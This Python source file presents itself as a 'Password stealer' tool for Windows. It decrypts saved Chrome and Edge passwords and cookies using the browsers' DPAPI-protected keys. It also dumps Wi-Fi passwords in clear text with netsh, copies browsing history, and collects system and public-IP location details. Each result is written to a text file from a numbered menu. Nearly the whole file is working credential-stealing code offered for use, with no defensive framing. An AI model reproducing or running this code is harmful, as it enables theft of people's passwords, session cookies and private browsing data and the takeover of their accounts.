from cryptography_ac import Crypt_ac
import base64
from os import listdir 
from os.path import isfile,join
import sqlite3
import json
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import os
import subprocess
import subprocess
import psutil
import platform
import requests
from ffd import Delet_files
import time


class Multi_password_stealer(object):
            
    class Chrome(object):
        def _get_key(self):
            file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Google\\Chrome\\User Data\\Local State', "r" ,encoding='iso-8859-1')
            data=file.read()
            data=json.loads(data)
            return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]
        
        def get_datetime(self,chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        
        def _decrypt_password(self,key,iv,en_pass):
            try:
                return Crypt_ac().Symmetric_encryption(key,iv).decrypt_aes_gcm(en_pass)[:-16].decode() 
            except Exception as e:
                pass
            
        def cp_path(self,path,name):
            p = subprocess.Popen('chdir '+os.environ['AppData']+'\\ && mkdir Process', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            shutil.copy2(path,os.environ['AppData']+'\\Process\\'+name)
            return os.environ['AppData']+'\\Process\\'+name
            
            
        def show(self):
            user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
            profiles = ["Default",'Guest profile']
            for i in os.listdir(user_data):
                if "Profile " in i:
                    profiles.append(i)
            for_file=[]
            loc_profile=[]
            counter=0
            for i in profiles:
                try:
                    path_db=self.cp_path(user_data+i+'\\Login Data',i+' login.db') 
                    conn=sqlite3.connect(path_db)
                    cursor=conn.cursor()
                except Exception as e:
                    print(e)
                try:
                    cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                    for n in cursor.fetchall():
                        url = n[0]
                        username = n[1]
                        decrypt_password=self._decrypt_password(self._get_key(),n[2][3:15],n[2][15:])
                        date_created = n[3]
                        date_last_used = n[4]
                        if len(username) >0:
                            for_file.append(f"{'password: '+str(decrypt_password)}")
                            for_file.append(f"{'username: '+username}")
                            for_file.append(f"{'url: '+url}")
                            counter+=3
                            if date_created != 86400000000 and date_created:
                                for_file.append(f"Creation date: {str(self.get_datetime(date_created))}")
                                counter+=1
                            if date_last_used != 86400000000 and date_last_used:
                                for_file.append(f"Last Used: {str(self.get_datetime(date_last_used))}")
                                counter+=1
                            for_file.append('\n'+("-"*60))
                            counter+=1
                except Exception as e:
                    print(e)
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove(path_db)
                except Exception as e:
                    pass
                for_file.append(i)
                counter+=1
                loc_profile.append(counter)
                    
                
            for_file=for_file[::-1]
            loc_profile=loc_profile[::-1]
            len_for_file=len(for_file)
            for i in range(len(loc_profile)):
                loc_profile[i]=len_for_file-loc_profile[i]
           
            res=[]  
            data=''
            for i in range(len(for_file)):
                if i in loc_profile:
                    c=0
                    res.append(for_file[i])
                    for n in range(i,len(for_file)):
                        if c == 1:
                            if  n not in loc_profile:
                                data+=for_file[n]+'\r\n'
                            else:
                                break
                        c=1
                    res.append(data)
                    data=''
            Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            return res
        
        def search(self,val):
            passwords=self.show()
            name=passwords[::2]
            passwords=passwords[1::2]
            t=0
            res=[]
            for i in range(len(passwords)):
                out=str(passwords[i]).split('\r\n')
                sevdvar=''
                c=0
                A=str(name[i])
                B='='*len(A)
                for n in range(len(out)):
                    if val in out[n]and 'http'in out[n] or val in out[n]and 'www'in out[n]:
                        t=1
                        C=(out[n-2][:-1])
                        D=(out[n-1][:-1])
                        E=(out[n][:-1])
                        F=(out[n+1][:-1])
                        G=(out[n+2][:-1])
                        if c==0:
                            if ('-'*10)not in C:
                                sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                                c=1
                            else:
                                sevdvar+=A+'\r\n'+B+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        else:
                            if ('-'*10)not in C:
                                sevdvar+=C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                            else:
                                sevdvar+=D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        c=1
                res.append(sevdvar)
                sevdvar=''                              
            if t<1:
                return["'"+val+"'"+" is not found.."]
            return res
        
        
           
    class Wifi(object):
        def _get_profiles(self): 
            p = subprocess.Popen("netsh wlan show  profile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            profiles=[]
            for line in p.stdout.readlines():
                line=line.decode()
                if 'All User Profile'in line:
                    line=line.strip().split(' : ')
                    profiles.append(line[-1])
            return profiles

        def _in_filter(self,profile):
            key_contant=None
            name=None
            p = subprocess.Popen("netsh wlan show  profile "+profile+' key=clear', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            for n in p.stdout.readlines():
                n=n.decode().strip()
                if "Name" in n:
                    n=n.split(" : ")
                    name=n[-1]
                elif "Key Content" in n:
                    n=n.split(" : ")
                    key_contant=n[-1]
            return [str(name),str(key_contant)]

        def show(self):
            res=f"{'Ssid':<30}{'Password':>30}\n"+'='*60+'\n'
            for i in self. _get_profiles():
                data=self._in_filter(i)
                res+=f"{data[0]:<30}{data[1]:>30}\n"
            return res
        
        
        
    class Edge(object):
        
        def _get_key(self):
            file = open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r" ,encoding='iso-8859-1')
            data=file.read()
            data=json.loads(data)
            return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]
        
        
        def _decrypt_password(self,key,iv,en_pass):
            try:
                return Crypt_ac().Symmetric_encryption(key,iv).decrypt_aes_gcm(en_pass)[:-16].decode() 
            except Exception as e:
                #print(e)
                return 'None'
            
        def get_datetime(self,edgetime):
            return datetime(1601, 1, 1) + timedelta(microseconds=edgetime)        
                        
        def cp_path(self,path,name):
            p = subprocess.Popen('chdir '+os.environ['AppData']+'\\ && mkdir Process', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            shutil.copy2(path,os.environ['AppData']+'\\Process\\'+name)
            return os.environ['AppData']+'\\Process\\'+name
        
        
        def show(self):
            user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\'
            profiles = ["Default"]
            for i in os.listdir(user_data):
                if "Profile " in i:
                    profiles.append(i)
                    
            for_file=[]
            loc_profile=[]
            counter=0
            for i in profiles:
                try:
                    path_db=self.cp_path(user_data+i+'\\Login Data',i+' edge login.db') 
                    conn=sqlite3.connect(path_db)
                    cursor=conn.cursor()
                except Exception as e:
                    print(e)
                try:
                    data=''
                    cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                    for n in cursor.fetchall():
                        url = n[0]
                        username = n[1]
                        decrypt_password=self._decrypt_password(self._get_key(),n[2][3:15],n[2][15:])
                        date_created = n[3]
                        date_last_used = n[4]
                        if len(username)>0:
                            if date_created != 86400000000 and date_created:
                                data+=(f"Creation date: {str(self.get_datetime(date_created))}\r\n")
                            if date_last_used != 86400000000 and date_last_used:
                                data+=(f"Last Used: {str(self.get_datetime(date_last_used))}\r\n")
                            data+=(f"{'url: '+url}\r\n")
                            data+=(f"{'username: '+username}\r\n")
                            data+=(f"{'password: '+str(decrypt_password)}\r\n")
                            data+=('\r\n'+("-"*60))
                            for_file.append(data)
                            counter+=1
                            data=''
                except Exception as e:
                    print(e)
                cursor.close()
                conn.close()
                try:
                    os.remove(path_db)
                except Exception as e:
                    print(e)
                    pass
                if len(data)<1:
                    for_file.append(data)
                    counter+=1
                for_file.append(i)
                counter+=1
                loc_profile.append(counter)
               
            for_file=for_file[::-1]
            loc_profile=loc_profile[::-1]
            len_loc=len(for_file)
            for i in range(len(loc_profile)):
                loc_profile[i]=len_loc-int(loc_profile[i])
    
            res=[]
            for i in range(len(for_file)):
                data=''
                if i in loc_profile:
                    res.append(for_file[i])
                    for n in range(i+1,len(for_file)):
                        if n not in loc_profile:
                            data+=for_file[n]+'\r\n'
                        else:
                            break
                    res.append(data)
            Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            return res
        
        def search(self,val):
            passwords=self.show()
            name=passwords[::2]
            passwords=passwords[1::2]
            t=0
            res=[]
            for i in range(len(passwords)):
                out=str(passwords[i]).split('\r\n')
                sevdvar=''
                c=0
                A=str(name[i])
                B='='*len(A)
                for n in range(len(out)):
                    if val in out[n]and 'http'in out[n] or val in out[n]and 'www'in out[n]:
                        t=1
                        C=(out[n-2][:-1])
                        D=(out[n-1][:-1])
                        E=(out[n][:-1])
                        F=(out[n+1][:-1])
                        G=(out[n+2][:-1])
                        if c==0:
                            if ('-'*10)not in C:
                                sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                                c=1
                            else:
                                sevdvar+=A+'\r\n'+B+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        else:
                            if ('-'*10)not in C:
                                sevdvar+=C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                            else:
                                sevdvar+=D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        c=1
                res.append(sevdvar)
                sevdvar=''                              
            if t<1:
                return["'"+val+"'"+" is not found.."]
            return res



class Web_information(object):

    class Chrome_history(object):

        def _get_profiles(self,path):
            possible_folders=['Default']
            for i in os.listdir(path):
                if 'Profile ' in i:
                    possible_folders.append(i)
            return possible_folders

        def _cp_file(self,path,name):
            Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            p = subprocess.Popen('chdir '+os.environ['AppData']+' && mkdir Process'+' && chdir Process && mkdir sih', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            files=open(path,'rb')
            with open(os.environ['AppData']+'\\Process\\sih\\'+name, 'wb')as file:
                file.write(files.read())
            return os.environ['AppData']+'\\Process\\sih\\'+name


        def show(self,num='all',val=''):
            try:
                num=int(num)
            except:
                num='all'
            username=os.getlogin()
            res=[]  
            for i in self._get_profiles("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data"):
                history_db=self._cp_file("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\"+i+"\\History",'chrom_'+i)
                #print(history_db)
                c = sqlite3.connect(history_db)
                cursor = c.cursor()
                select_statement=""" SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),
                                    url 
                             FROM urls
                             ORDER BY last_visit_time DESC
                         """
                cursor.execute(select_statement)
                results = cursor.fetchall()
                cursor.close()
                c.close()
                Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
                if num !='all'and len(results)>=num:
                    num_range=num
                else:
                    num_range=len(results)
                data=''
                for n in range(num_range):
                    dbstr=str(results[n])
                    if len(val)<1:
                        data+=(dbstr)
                        data+=('\n')
                        data+=("-"*50)
                        data+=('\n'*2)
                    else:
                        if val in dbstr:
                            data+=(dbstr)
                            data+=('\n')
                            data+=("-"*50)
                            data+=('\n'*2)
                res.append(i)
                res.append(data)
            return res
        
        def search(self,val):
            return self.show(val=val)


    class Edge_history(object):

        def _get_profiles(self,path):
            possible_folders=['Default']
            for i in os.listdir(path):
                if 'Profile ' in i:
                    possible_folders.append(i)
            return possible_folders

        def _cp_file(self,path,name):
            Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            p = subprocess.Popen('chdir '+os.environ['AppData']+' && mkdir Process'+' && chdir Process && mkdir sih', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            files=open(path,'rb')
            with open(os.environ['AppData']+'\\Process\\sih\\'+name, 'wb')as file:
                file.write(files.read())
            return os.environ['AppData']+'\\Process\\sih\\'+name


        def show(self,num='all',val=''):
            try:
                num=int(num)
            except:
                num='all'
            username=os.getlogin()
            res=[]  
            for i in self._get_profiles("C:\\Users\\"+username+"\\AppData\\Local\\Microsoft\\Edge\\User Data"):
                history_db=self._cp_file("C:\\Users\\"+username+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\"+i+"\\History",i)
                #print(history_db)
                c = sqlite3.connect(history_db)
                cursor = c.cursor()
                select_statement=""" SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),
                                    url 
                             FROM urls
                             ORDER BY last_visit_time DESC
                         """
                cursor.execute(select_statement)
                results = cursor.fetchall()
                cursor.close()
                c.close()
                Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
                if num !='all'and len(results)>=num:
                    num_range=num
                else:
                    num_range=len(results)
                data=''
                for n in range(num_range):
                    dbstr=str(results[n])
                    if len(val)<1:
                        data+=(dbstr)
                        data+=('\n')
                        data+=("-"*50)
                        data+=('\n'*2)
                    else:
                        if val in dbstr:
                            data+=(dbstr)
                            data+=('\n')
                            data+=("-"*50)
                            data+=('\n'*2)
                res.append(i)
                res.append(data)
            return res

        def search(self,val):
            return self.show(val=val)
        
        
    class Chrome_cookies(object):
    
        def _get_key(self):
            file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Google\\Chrome\\User Data\\Local State', "r" ,encoding='iso-8859-1')
            data=file.read()
            data=json.loads(data)
            return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]
        
        def _get_datetime(self,chromedate):
            if chromedate != 86400000000 and chromedate:
                return str(datetime(1601, 1, 1) + timedelta(microseconds=chromedate))
            else:
                return ''
        
        def _decrypt_password(self,key,iv,en_pass):
            try:
                return Crypt_ac().Symmetric_encryption(key,iv).decrypt_aes_gcm(en_pass)[:-16].decode() 
            except Exception as e:
                #print(e)
                try:
                    return str(win32crypt.CryptUnprotectData(en_pass, None, None, None, 0)[1])
                except Exception as e:
                    #print(e)
                    return ''
            
        def _cp_path(self,path,name):
            p = subprocess.Popen('chdir '+os.environ['AppData']+'\\ && mkdir Process', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            shutil.copy2(path,os.environ['AppData']+'\\Process\\'+name)
            return os.environ['AppData']+'\\Process\\'+name
            
            
        def show(self,val=''):
            user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
            profiles = ["Default"]
            for i in os.listdir(user_data):
                if "Profile " in i:
                    profiles.append(i)
            res=[]
            for i in profiles:
                data=''
                res.append(i)
                try:
                    path_db=self._cp_path(user_data+i+'\\Network\\Cookies',i+' cookies.db') 
                    conn=sqlite3.connect(path_db)
                    cursor=conn.cursor()
                except Exception as e:
                    print(e)
                try:
                    cursor.execute("""
                        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                        FROM cookies
                        WHERE host_key like '%"""+val+"%'")
                    for n in cursor.fetchall():
                        if not n[2]:
                            dec_value=self._decrypt_password(self._get_key(),n[6][3:15],n[6][15:])
                        else:
                            dec_value = n[n]
                        data+=f"Creation : {self._get_datetime(n[3])[:-7]}\n"
                        data+=f"Domain: {n[0]}\n"
                        data+=f"Cookie name: {n[1]}\n"
                        data+=f"Cookie value: {dec_value}\n"
                        data+=f"Last used: {self._get_datetime(n[4])[:-7]}\n"
                        data+=f"Expires : {self._get_datetime(n[5])[:-7]}\n"
                        data+="-"*40+'\n'*2
                except Exception as e:
                    #print(e)
                    pass
                res.append(data)
                try:
                    cursor.close()
                    conn.close()
                except Exception as e:
                    #print(e)
                    pass
                Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            return res
        
        def search(self,val):
            return self.show(val=val)


          
    class Edge_cookies(object):
    
        def _get_key(self):
            file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Microsoft\\Edge\\User Data\\Local State', "r" ,encoding='iso-8859-1')
            data=file.read()
            data=json.loads(data)
            return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]
        
        def _get_datetime(self,chromedate):
            if chromedate != 86400000000 and chromedate:
                try:
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=chromedate))
                except:
                    pass
            else:
                return ''
        
        def _decrypt_password(self,key,iv,en_pass):
            try:
                return Crypt_ac().Symmetric_encryption(key,iv).decrypt_aes_gcm(en_pass)[:-16].decode() 
            except Exception as e:
                #print(e)
                try:
                    return str(win32crypt.CryptUnprotectData(en_pass, None, None, None, 0)[1])
                except Exception as e:
                    #print(e)
                    return ''
            
        def _cp_path(self,path,name):
            p = subprocess.Popen('chdir '+os.environ['AppData']+'\\ && mkdir Process', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            p.stdout.readlines()
            shutil.copy2(path,os.environ['AppData']+'\\Process\\'+name)
            return os.environ['AppData']+'\\Process\\'+name
            
            
        def show(self,val=''):
            user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\'
            profiles = ["Default"]
            for i in os.listdir(user_data):
                if "Profile " in i:
                    profiles.append(i)
            res=[]
            for i in profiles:
                data=''
                res.append(i)
                try:
                    path_db=self._cp_path(user_data+i+'\\Network\\Cookies',i+' cookies.db') 
                    conn=sqlite3.connect(path_db)
                    cursor=conn.cursor()
                except Exception as e:
                    print(e)
                try:
                    cursor.execute("""
                        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                        FROM cookies
                        WHERE host_key like '%"""+val+"%'")
                    for n in cursor.fetchall():
                        if not n[2]:
                            dec_value=self._decrypt_password(self._get_key(),n[6][3:15],n[6][15:])
                        else:
                            dec_value = n[n]
                        data+=f"Creation : {self._get_datetime(n[3])[:-7]}\n"
                        data+=f"Domain: {n[0]}\n"
                        data+=f"Cookie name: {n[1]}\n"
                        data+=f"Cookie value: {dec_value}\n"
                        data+=f"Last used: {self._get_datetime(n[4])[:-7]}\n"
                        data+=f"Expires : {self._get_datetime(n[5])[:-7]}\n"
                        data+="-"*40+'\n'*2
                except Exception as e:
                    #print(e)
                    pass
                res.append(data)
                try:
                    cursor.close()
                    conn.close()
                except Exception as e:
                    print(e)
                    pass
                Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            Delet_files().recursive_fles_delete(os.environ['AppData']+'\\Process\\')
            return res
        
        def search(self,val):
            return self.show(val=val)


class Computer_inforamtion:
    
    def regional_time(self):
        r=requests.get(r'https://ipinfo.io/json')
        cuntry=r.json()['country'].strip()
        city=r.json()['timezone'].strip().split('/')[-1]
        now=datetime.now()
        dt=now.strftime("%d/%m/%Y %H:%M:%S")
        return f"Zone: {cuntry} {city}"+'\n'+f"Time: {dt}"+'\n'+'-'*25+'\n'
        
        
    def boot_time(self):
        rt=psutil.boot_time()
        bt = datetime.fromtimestamp(rt)
        return '='*40+'Boot time'+'='*40+'\n'+f"{'Boot time:':<20} {bt.year:}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"+'\n'

    def get_size(self,size):
        sizes=['B','KB','MB','GB','TB','PB','EB','ZB','YB']
        for i in range(len(sizes)):
            if 1024>size:
                return str(round(size,1))+sizes[i]
            size=size/1024
        return size
            
    def system_info(self):
        out=''
        p=platform.uname()
        out+="="*40+" System Information "+"="*40+'\n'
        out+=f"{'System':<20} {p.system:<40}"+'\n'
        out+=f"{'Computer Name':<20} {p.node:<40}"+'\n'
        out+=f"{'User name':<20} {str(os.getlogin()):<40}"+'\n'
        out+=f"{'Release':<20} {p.release:<40}"+'\n'
        out+=f"{'Version':<20} {p.version:<40}"+'\n'
        out+=f"{'Machine':<20} {p.machine:<40}"+'\n'
        out+=f"{'Processor':<20} {p.processor:<40}"+'\n'
        return out
    
    def cpu_info(self):
        out=''
        out+="="*40+" CPU Info "+ "="*40+'\n'
        out+=f"{'Physical cores:':<20} {str(psutil.cpu_count(logical=False)):<45}"+'\n'
        out+=f"{'Total cores:':<20} {str(psutil.cpu_count(logical=True)):<45}"+'\n'
        cpufreq = psutil.cpu_freq()
        out+=f"{'Max Frequency:':<20} {str(round(cpufreq.max,2))+' Mhz':<45}"+'\n'
        out+=f"{'Min Frequency:':<20} {str(round(cpufreq.min,2))+' Mhz':<45}"+'\n'
        out+=f"{'Current Frequency:':<20} {str(round(cpufreq.current,2))+' Mhz':<45}"+'\n\n'
        out+='='*20+" CPU Usage Per Core: "+'='*20+'\n'
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            out+=f"{'Core:'+str(i):<20} {str(percentage)+'%':<45}"+'\n'
        out+=f"{'Total CPU Usage:':<20} {str(psutil.cpu_percent())+'%':<45}"+'\n'
        return out

    def memory_info(self): 
        out=''
        out+="="*40+" Memory Information "+"="*40+'\n'
        svmem = psutil.virtual_memory()
        out+=f"{'Total:':<20} {self.get_size(svmem.total):<45}"+'\n'
        out+=f"{'Available:':<20} {self.get_size(svmem.available):<45}"+'\n'
        out+=f"{'Used:':<20} {self.get_size(svmem.used):<45}"+'\n'
        out+=f"{'Percentage:':<20} {str(svmem.percent)+'%':<45}"+'\n\n'
        out+="="*20+" SWAP "+"="*20+'\n'
        swap = psutil.swap_memory()
        out+=f"{'Total:':<20} {self.get_size(swap.total):<45}"+'\n'
        out+=f"{'Free:':<20} {self.get_size(swap.free):<45}"+'\n'
        out+=f"{'Used:':<20} {self.get_size(swap.used):<45}"+'\n'
        out+=f"{'Percentage:':<20} {str(swap.percent)+'%'}"+'\n'
        return out
        
    def disk_info(self):
        out=''
        out+="="*40+" Disk Information "+"="*40+'\n'
        out+='='*20+" Partitions and Usage "+'='*20+'\n'
        partitions=psutil.disk_partitions()
        for partition in partitions:
            out+=f"  === Device: {partition.device} ===\n"
            out+=f"{'  Mountpoint:':<20} {partition.mountpoint:<45}"+'\n'
            out+=f"{'  File system type:':<20} {partition.fstype:<45}"+'\n'
            try:
                partition_usage=psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            out+=f"{'  Total Size:':<20} {self.get_size(partition_usage.total):<45}"+'\n'
            out+=f"{'  Used:':<20} {self.get_size(partition_usage.used):<40}"+'\n'
            out+=f"{'  Free:':<20}{self.get_size(partition_usage.free):20}"+'\n'
            out+=f"{'  Percentage:':<20} {str(partition_usage.percent)+'%'}"+'\n'

        disk_io = psutil.disk_io_counters()
        out+=f"Total read: {self.get_size(disk_io.read_bytes)}"+'\n'
        out+=f"{'Total write:':<20} {self.get_size(disk_io.write_bytes):<45}"+'\n'
        return out

    
    def network_info(self):
        out=''
        out+="="*40+" Network Information "+"="*40
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                out+=f"=== Interface: {interface_name} ==="+'\n'
                if str(address.family) == 'AddressFamily.AF_INET':
                    out+=f"{'  IP Address:':<20} {address.address}"+'\n'
                    out+=f"{'  Netmask:':<20} {address.netmask}"+'\n'
                    out+=f"{'  Broadcast IP:':<20} {address.broadcast}"+'\n'
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    out+=f"{'  MAC Address:':<20} {address.address}"+'\n'
                    out+=f"{'  Netmask:':<20} {address.netmask}"+'\n'
                    out+=f"{'  Broadcast MAC:':<20} {address.broadcast}"+'\n'
        net_io = psutil.net_io_counters()
        out+=f"Total Bytes Sent: {self.get_size(net_io.bytes_sent):<20}"+'\n'
        out+=f"Total Bytes Received: {self.get_size(net_io.bytes_recv):<20}"+'\n'
        return out

    
    def public_ip_information(self):
        ainfo = 'ip hostname city country loc'.split()
        binfo = 'public,rout V,city,country,loc'.split(',')
        r = requests.get(r'https://ipinfo.io/json')
        data="="*40+" Public ip information "+"="*40+'\n'
        for i in range(len(ainfo)):
            try:
                info=r.json()[ainfo[i]]
                info=format(info)
                data+=(f'{binfo[i]:<20}{info:<80}')+'\n'
            except Exception as e :
                print(e)
                pass
        try:
            loc=r.json()['loc']
            loc=format(loc)
            data+=(f'{"map":<20}{"https://www.google.com/maps/search/google+map++" + loc:<80}')+'\n'
        except: 
            pass
        return data


    def show(self):
        output=''
        output+=self.regional_time()+'\n'
        output+=self.system_info()+'\n'
        output+=self.boot_time()+'\n'
        output+=self.cpu_info()+'\n'
        output+=self.memory_info()+'\n'
        output+=self.disk_info()+'\n'
        output+=self.network_info()+'\n'
        output+=self.public_ip_information()+'\n'
        return output









def main():
    help_='\n'
    help_+=('========= Password stealer ===========')+'\n'
    help_+=(f"|{'  To extract crhome passwords.  (1)'} |")+'\n'
    help_+=(f"|{'  To extract edge passwords.    (2)'} |")+'\n'
    help_+=(f"|{'  To extract wifi passwords.    (3)'} |")+'\n'
    help_+=(f"|{'  To extract crhome history.    (4)'} |")+'\n'
    help_+=(f"|{'  To extract edge history.      (5)'} |")+'\n'
    help_+=(f"|{'  To extract crhome cookies.    (6)'} |")+'\n'
    help_+=(f"|{'  To extract edge cookies.      (7)'} |")+'\n'
    help_+=(f"|{'  To get computer information.  (8)'} |")+'\n'
    help_+=(f"|{'  To send command (9) + command.   '} |")+'\n'
    help_+=('-'*38)+'\n'
    print(help_)
    time.sleep(0.4)
    password=Multi_password_stealer()
    web=Web_information()
    comp=Computer_inforamtion()
    while True:
        option=input('Select an option > ')
        if option =='1':
            print("Processing...")
            with open('Chrome Password.txt','w')as file:
                for i in password.Chrome().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Chrome Password.txt')

        elif option == '2':
            print("Processing...")
            with open('Edge Password.txt','w')as file:
                for i in password.Edge().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Edge Password.txt')

        elif option == '3':
            print("Processing...")
            with open('Wifi.txt','w')as file:
                    file.write(password.Wifi().show())
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Wifi.txt')

        elif option == "4":
            print("Processing...")
            with open('Chrome History.txt','w')as file:
                for i in web.Chrome_history().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Chrome History.txt')


        elif option=='5':
            print("Processing...")
            with open('Edge History.txt','w')as file:
                for i in web.Edge_history().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Edge History.txt')

        elif option == '6':
            print("Processing...")
            with open('Chrome Cookies.txt','w')as file:
                for i in web.Chrome_cookies().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Chrome Cookies.txt')

        elif option=='7':
            print("Processing...")
            with open('Edge Cookies.txt','w')as file:
                for i in web.Edge_cookies().show():
                    file.write(i+'\n')
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Edge Cookies.txt')

        elif option=='8':
            print("Processing...")
            with open('Computer Information.txt','wb')as file:
                    file.write(comp.show().encode(errors='replace'))
            time.sleep(0.5)
            print('resault file was open! 🢃')
            os.startfile('Computer Information.txt')
            


if __name__=='__main__':
    main()